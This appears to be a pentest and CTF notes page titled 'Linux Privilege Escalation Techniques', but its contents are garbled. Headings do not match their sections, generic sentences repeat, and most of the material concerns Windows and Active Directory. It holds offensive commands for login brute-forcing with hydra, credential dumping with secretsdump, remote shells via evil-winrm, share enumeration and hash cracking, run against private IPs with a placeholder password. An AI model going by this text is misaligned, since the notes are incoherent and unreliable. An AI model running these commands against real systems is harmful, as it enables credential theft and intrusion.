---
TitleSEO: "Linux Privilege Escalation Techniques | ZureFX"
TitlePost: "Linux Privilege Escalation Techniques"
Author: "ZureFX"
Description: "Personal notes on Linux Privilege Escalation Techniques. Quick reference for pentesting and CTF challenges."
Keywords: "privilege escalation, malware, windows, oscp, enumeration, lateral movement"
URL: "https://zurefx.github.io/notes/note-linux-privilege-escalation-techniques-779.html"
URL_IMAGES: ""
Date: "2024-03-17"
Tags: "Privilege Escalation, Malware, Windows, OSCP, Enumeration, Lateral Movement"
Section: "notes"
Lang: "en"
main_img: "note-linux-privilege-escalation-techniques-779"
Permalink: "/notes/note-linux-privilege-escalation-techniques-779.html"
BtnLabel: "Read Notes"
Pick: 0
---
## CORS Misconfiguration

### SMB

The web application was vulnerable to Server-Side Template Injection (SSTI). Unconstrained delegation was enabled on the compromised machine. The backup files contained sensitive information that should not have been accessible. The target system was identified as running a vulnerable version of the service. The service was running without proper input validation, leading to injection vulnerabilities.

Unconstrained delegation was enabled on the compromised machine. Token impersonation allowed elevation to SYSTEM privileges on the target. The web application was vulnerable to Server-Side Template Injection (SSTI). Authentication bypass was achieved through careful manipulation of the login mechanism.

```python
nmap -sCV -p8443,23,143 10.90.148.169 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.76.133.52 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
```

The application stored sensitive credentials in an unencrypted configuration file. The scheduled task ran with elevated privileges and could be abused for escalation. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.75.163.47
evil-winrm -i 10.123.80.180 -u administrator -p 'P@ssw0rd!'
```

## lookupsid

### smbclient

```bash
crackmapexec smb 10.30.182.71 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.41.91.182 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.53.36.122 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.58.90.247
```

## Node.js

### ligolo-ng

The web application was vulnerable to Server-Side Template Injection (SSTI). The target system was identified as running a vulnerable version of the service. Command injection was possible through unsanitized user input in the search functionality. The scheduled task ran with elevated privileges and could be abused for escalation. Post-exploitation enumeration revealed a path to domain administrator privileges.

The web application was vulnerable to Server-Side Template Injection (SSTI). The application stored sensitive credentials in an unencrypted configuration file.

```powershell
evil-winrm -i 10.71.201.164 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.59.169.249/FUZZ
```

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.67.170.254/FUZZ
evil-winrm -i 10.44.141.89 -u administrator -p 'P@ssw0rd!'
```

## Docker Escape

### HTTP

The application stored sensitive credentials in an unencrypted configuration file. Authentication bypass was achieved through careful manipulation of the login mechanism. The backup files contained sensitive information that should not have been accessible. Initial enumeration revealed several interesting open ports on the target. The service was running without proper input validation, leading to injection vulnerabilities.

- `CSRF`
- `SSTI`
- `Local File Inclusion`

## LDAP

### sharphound

> **Note:** Open Redirect was identified as the primary attack vector in this scenario.

```bash
nmap -sCV -p23,3306,53 10.19.44.237 -oN scan.txt
```

- `enum4linux`
- `atexec`
- `AS-REP Roasting`
- `kerbrute`
- `hashcat`
- `Broken Access Control`
